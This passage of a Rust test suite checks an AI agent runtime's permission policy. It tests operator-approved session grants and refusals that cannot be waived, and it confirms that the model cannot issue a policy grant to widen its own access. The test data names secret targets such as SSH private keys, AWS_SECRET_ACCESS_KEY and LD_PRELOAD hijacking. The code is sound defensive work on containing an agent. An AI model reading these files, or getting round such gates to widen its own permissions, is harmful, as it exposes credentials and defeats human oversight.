            crate::executor::confine::resolve_write(
                &dir.path().join("out.txt").to_string_lossy(),
                &effective.policy
            )
            .is_err(),
            "a read grant widened the write roots"
        );
    }

    /// No grant, no clone: the ordinary action sees the operator's own config.
    #[test]
    fn a_session_without_path_grants_does_not_rewrite_the_config() {
        let p = engine_with(|_| {});
        let base = p.config.clone();
        assert!(
            p.config_with_session_grants(&base).is_none(),
            "an ungranted session widened the policy"
        );
    }

    /// A path grant names the DIRECTORY of the file that was refused, and the
    /// prompt says so.
    ///
    /// The label has said "directory (read)" since the feature shipped while
    /// the value was the file (`…/tickets/ticket-002.txt`, field report
    /// 2026-08-16). Owner's arbitration: one answer covers the directory. A
    /// failure means the operator is back to one question per file, or that
    /// the prompt promises a directory and grants something else.
    #[test]
    fn a_read_grant_covers_the_parent_directory_and_says_so() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("ticket-002.txt");
        std::fs::write(&file, b"x").unwrap();

        let lift = DenyReason::PathNotInAllowlist {
            path: file.to_string_lossy().to_string(),
            access: PathAccess::Read,
        }
        .liftable("ReadFile")
        .expect("a path outside the roots must be offered");

        assert_eq!(lift.kind, GrantKind::ReadPath);
        assert_eq!(
            lift.value,
            dir.path().to_string_lossy(),
            "the grant names the file, not its directory"
        );
        assert!(
            lift.session_choice().contains("(this directory)"),
            "the prompt does not say what the yes covers: {}",
            lift.session_choice()
        );

        // A directory that was refused is offered as itself, not as its parent.
        let lift = DenyReason::PathNotInAllowlist {
            path: dir.path().to_string_lossy().to_string(),
            access: PathAccess::Read,
        }
        .liftable("ListDirectory")
        .expect("a directory outside the roots must be offered");
        assert_eq!(lift.value, dir.path().to_string_lossy());
    }

    /// A write outside the roots is a question, not a wall.
    ///
    /// Same liftable path as the read, checked on its own because the field
    /// report showed a WriteFile refused with no offer beside it and the two
    /// sides are separate arms of the same match.
    #[test]
    fn a_write_outside_the_roots_is_offered_at_the_session_gate() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("out").join("count.txt");

        let lift = DenyReason::PathNotInAllowlist {
            path: target.to_string_lossy().to_string(),
            access: PathAccess::Write,
        }
        .liftable("WriteFile")
        .expect("a write outside the roots must be offered at the gate");

        assert_eq!(lift.kind, GrantKind::WritePath);
        assert_eq!(
            lift.value,
            dir.path().join("out").to_string_lossy(),
            "the write grant does not name the target's directory"
        );
        assert!(
            lift.session_choice().contains("(this directory)"),
            "the prompt does not say what the yes covers: {}",
            lift.session_choice()
        );
    }

    /// SECURITY: the list of refusals a prompt may offer to waive is a written
    /// table, checked variant by variant against `liftable`.
    ///
    /// This is the same device as `every_always_allow_entry_has_no_capability`
    /// and for the same reason: the exhaustive `match` forces the NEXT
    /// `DenyReason` to be decided, but it cannot stop someone from deciding
    /// wrongly to make the compiler quiet. The table below is where that
    /// decision has to be argued, and a failure here means a refusal changed
    /// sides without anyone saying so — either a boundary became waivable from
    /// a keystroke, or a decision that belongs to the operator silently went
    /// back to being a wall.
    #[test]
    fn the_liftable_reasons_are_an_exhaustive_match() {
        // (reason, expected grant kind or None, why — the argument lives at
        //  the match arm; this is the pin.)
        let cases: Vec<(DenyReason, Option<GrantKind>)> = vec![
            (
                DenyReason::CommandNotAllowed {
                    command: "ls".into(),
                },
                Some(GrantKind::Command),
            ),
            (
                DenyReason::PathNotInAllowlist {
                    path: "/srv/x".into(),
                    access: PathAccess::Read,
                },
                Some(GrantKind::ReadPath),
            ),
            (
                DenyReason::PathNotInAllowlist {
                    path: "/srv/x".into(),
                    access: PathAccess::Write,
                },
                Some(GrantKind::WritePath),
            ),
            (DenyReason::ActionDisabled, Some(GrantKind::Action)),
            // ── the walls ────────────────────────────────────────────────
            (
                DenyReason::PathMatchesDenyPattern {
                    path: "/home/u/.ssh/id_ed25519".into(),
                    pattern: "**/.ssh/**".into(),
                },
                None,
            ),
            (DenyReason::ReadonlyMode, None),
            (DenyReason::PlanMode, None),
            (DenyReason::DefaultDeny, None),
            (DenyReason::DesktopDisabled, None),
            (
                DenyReason::EnvVarNotReadable {
                    name: "AWS_SECRET_ACCESS_KEY".into(),
                },
                None,
            ),
            (DenyReason::NestingNotAllowed, None),
            (
                DenyReason::ImageNotAllowed {
                    image: "docker.io/evil".into(),
                },
                None,
            ),
            (
                DenyReason::PipelineStepDenied {
                    step: 2,
                    step_type: "WriteFile".into(),
                    reason: Box::new(DenyReason::CommandNotAllowed {
                        command: "ls".into(),
                    }),
                },
                None,
            ),
            // Written decision (2026-08-20): NOT liftable. The denylist of
            // `check_caller_env` (LD_PRELOAD and relatives) is closed by
            // design — no TOML setting behind it, so nothing that a « yes »
            // could grant. Same reasoning as `EnvVarNotReadable`: loader
            // hijacking material, not a list the operator edits.
            (
                DenyReason::CallerEnvDenied {
                    why: "LD_PRELOAD".into(),
                },
                None,
            ),
            // Written decision: NOT liftable. An opaque script's programs are not
            // on screen to approve; the way past is `--allow-all-commands`.
            (
                DenyReason::CommandNotAnalyzable {
                    command: "bash script.sh".into(),
                },
                None,
            ),
        ];

        // The table must cover the enum. There is no reflection over variants
        // in Rust, so this counts what the enum declaration holds — a new
        // variant makes the exhaustive `match` in `liftable` fail to compile,
        // and this assertion makes the table fail the moment it does not.
        let declared = include_str!("policy.rs");
        let body = declared
            .split("pub enum DenyReason {")
            .nth(1)
            .and_then(|s| s.split("\n}").next())
            .expect("DenyReason declaration not found");
        let variants = body
            .lines()
            .filter(|l| {
                let t = l.trim();
                !t.is_empty()
                    && !t.starts_with("//")
                    && !t.starts_with('#')
                    && (t.ends_with('{') || t.ends_with(','))
                    && t.chars().next().is_some_and(|c| c.is_ascii_uppercase())
            })
            .count();
        // Two `PathNotInAllowlist` rows (read and write) for one variant.
        assert_eq!(
            cases.len() - 1,
            variants,
            "the table covers {} reasons, the enum declares {variants}. A DenyReason \
             was added or removed without deciding, in writing, whether an operator \
             may waive it from a prompt.",
            cases.len() - 1
        );

        for (reason, expected) in cases {
            let got = reason.liftable("WriteFile");
            match (expected, &got) {
                (Some(kind), Some(lift)) => assert_eq!(
                    lift.kind, kind,
                    "{reason:?} offers the wrong list: {:?}",
                    lift.kind
                ),
                (None, None) => {}
                (Some(kind), None) => {
                    panic!("{reason:?} should be offered as a {kind:?} grant and is a wall")
                }
                (None, Some(lift)) => panic!(
                    "SECURITY: {reason:?} is now waivable from a prompt as {:?} '{}'. \
                     That is a boundary, not a list.",
                    lift.kind, lift.value
                ),
            }
        }
    }

    /// SECURITY: the three refusals the field report names as walls stay walls
    /// end to end — measured through `evaluate`, not by calling `liftable` by
    /// hand.
    ///
    /// A failure means the prompt would show "1 allow for this session" over a
    /// deny pattern, a readonly runtime, or a snapshot deletion — three things
    /// the operator asked to be unconditional.
    #[test]
    fn an_unliftable_denial_is_never_offered() {
        // (a) a deny pattern
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().to_string_lossy().to_string();
        let secret = tmp.path().join(".ssh");
        std::fs::create_dir(&secret).unwrap();
        let key = secret.join("id_ed25519");
        std::fs::write(&key, "k").unwrap();

        let p = engine_with(|c| {
            c.policy.allowed_read_paths = vec![root.clone()];
            c.policy.deny_path_patterns = vec!["**/.ssh/**".into()];
        });
        let action = act(serde_json::json!({"type":"ReadFile","path": key.to_string_lossy()}));
        let PolicyEffect::Deny(reason) = p.evaluate(&action) else {
            panic!("a key under a deny pattern was not refused at all");
        };
        assert!(
            reason.liftable(action.type_name()).is_none(),
            "a deny pattern was offered as a choice: {reason:?}"
        );

        // (b) readonly mode
        let p = engine_with(|c| {
            c.policy.mode = "readonly".into();
            c.policy.allowed_write_paths = vec![root.clone()];
        });
        let action =
            act(serde_json::json!({"type":"WriteFile","path": format!("{root}/x"), "content":"x"}));
        let PolicyEffect::Deny(reason) = p.evaluate(&action) else {
            panic!("readonly mode allowed a write");
        };
        assert_eq!(reason, DenyReason::ReadonlyMode);
        assert!(
            reason.liftable(action.type_name()).is_none(),
            "readonly mode was offered as a choice"
        );

        // (c) invariant 7: DeleteSnapshot removes the safety net itself. It is
        // not in this feature's scope — no grant kind can reach the human gate
        // that guards it — and the point of this arm is that widening
        // `[actions]` for it is still only the CONFIGURATION half. The
        // orchestrator's gate asks anyway.
        let p = engine_with(|c| {
            c.actions.insert("DeleteSnapshot".into(), false);
        });
        let action = act(serde_json::json!({"type":"DeleteSnapshot","name":"s1"}));
        let PolicyEffect::Deny(reason) = p.evaluate(&action) else {
            panic!("a disabled DeleteSnapshot was allowed");
        };
        let lift = reason
            .liftable(action.type_name())
            .expect("an [actions] switch is the operator's to flip");
        assert_eq!(lift.kind, GrantKind::Action);
        assert_eq!(
            lift.value, "DeleteSnapshot",
            "the grant must name the action it enables"
        );
    }

    /// A grant widens THIS process and nothing else.
    ///
    /// A failure means a "for this session" answer outlived the session — the
    /// operator was told the widening would be gone at exit and it was not.
    #[test]
    fn a_session_grant_dies_with_the_runtime() {
        let first = engine_with(|_| {});
        first
            .apply_grant(&PolicyGrant {
                kind: GrantKind::Command,
                value: "ls".into(),
                persist: false,
            })
            .unwrap();
        let action = act(serde_json::json!({"type":"RunCommand","command":"ls"}));
        assert!(
            matches!(first.evaluate(&action), PolicyEffect::Allow),
            "the grant did not take effect in the process that received it"
        );

        // A second engine is what the next process — or a `--resume` — gets.
        let second = engine_with(|_| {});
        assert_eq!(second.granted_count(), 0);
        assert!(
            matches!(
                second.evaluate(&action),
                PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
            ),
            "a session grant survived into a fresh runtime"
        );

        // And a clone of the SAME engine — what `ServerState` holds — does see
        // it, or a grant applied through the control channel would be invisible
        // to the executor.
        let clone = first.clone();
        assert_eq!(clone.granted_count(), 1);
        assert!(matches!(clone.evaluate(&action), PolicyEffect::Allow));
    }

    /// A granted directory confines exactly like a configured root.
    ///
    /// A failure means "allow this directory for the session" grants more than
    /// the directory: the component-wise containment test is what stops
    /// `/srv/root` from covering `/srv/rootEVIL`, and a grant that skipped it
    /// would be a second, weaker implementation of confinement.
    #[test]
    fn a_granted_directory_confines_like_a_configured_one() {
        let tmp = tempfile::tempdir().unwrap();
        let inside = tmp.path().join("ok");
        std::fs::create_dir(&inside).unwrap();
        std::fs::write(inside.join("f"), "x").unwrap();
        let sibling = tmp.path().join("okEVIL");
        std::fs::create_dir(&sibling).unwrap();
        std::fs::write(sibling.join("f"), "x").unwrap();

        let p = engine_with(|c| c.policy.allowed_read_paths = vec![]);
        p.apply_grant(&PolicyGrant {
            kind: GrantKind::ReadPath,
            value: inside.to_string_lossy().to_string(),
            persist: false,
        })
        .unwrap();

        let read = |path: std::path::PathBuf| {
            act(serde_json::json!({"type":"ReadFile","path": path.to_string_lossy()}))
        };
        assert!(matches!(
            p.evaluate(&read(inside.join("f"))),
            PolicyEffect::Allow
        ));
        assert!(
            matches!(
                p.evaluate(&read(sibling.join("f"))),
                PolicyEffect::Deny(DenyReason::PathNotInAllowlist { .. })
            ),
            "a granted root covered its string-prefix sibling"
        );
    }

    /// A read grant is not a write grant.
    ///
    /// A failure means answering "yes" to "may I look in ./playground" also
    /// authorized writing there — the exact confusion the `PathAccess` field
    /// was added to prevent.
    #[test]
    fn a_read_grant_does_not_authorize_a_write() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().to_string_lossy().to_string();
        let p = engine_with(|c| {
            c.policy.allowed_read_paths = vec![];
            c.policy.allowed_write_paths = vec![];
        });
        p.apply_grant(&PolicyGrant {
            kind: GrantKind::ReadPath,
            value: dir.clone(),
            persist: false,
        })
        .unwrap();

        assert!(matches!(
            p.evaluate(&act(
                serde_json::json!({"type":"ReadFile","path": format!("{dir}/f")})
            )),
            PolicyEffect::Allow
        ));
        let write =
            act(serde_json::json!({"type":"WriteFile","path": format!("{dir}/f"), "content":"x"}));
        let PolicyEffect::Deny(reason) = p.evaluate(&write) else {
            panic!("a read grant authorized a write");
        };
        assert_eq!(
            reason,
            DenyReason::PathNotInAllowlist {
                path: format!("{dir}/f"),
                access: PathAccess::Write
            }
        );
    }

    /// SECURITY: `PolicyGrant` is not, and must never become, an action.
    ///
    /// A failure means the model can widen the policy by writing JSON — the
    /// single worst outcome this feature could have, because every other
    /// guarantee here assumes a human answered a prompt.
    #[test]
    fn the_model_cannot_emit_a_policy_grant() {
        assert!(
            !x0ne_actions::all_type_names().contains(&"PolicyGrant"),
            "PolicyGrant entered the action vocabulary; ListActions now teaches it to the model"
        );
        for shape in [
            serde_json::json!({"type": "PolicyGrant", "kind": "command", "value": "ls"}),
            serde_json::json!({"type": "PolicyGrant"}),
            serde_json::json!({"type": "Control", "control": "PolicyGrant"}),
        ] {
            assert!(
                serde_json::from_value::<Action>(shape.clone()).is_err(),
                "the runtime accepted {shape} as an action"
            );
        }
        // And the control shape is not an action either: it has no `type`, so
        // the orchestrator's parser rejects it before anything else does.
        assert!(serde_json::from_value::<Action>(
            serde_json::json!({"control": "PolicyGrant", "kind": "command", "value": "ls"})
        )
        .is_err());
    }
}
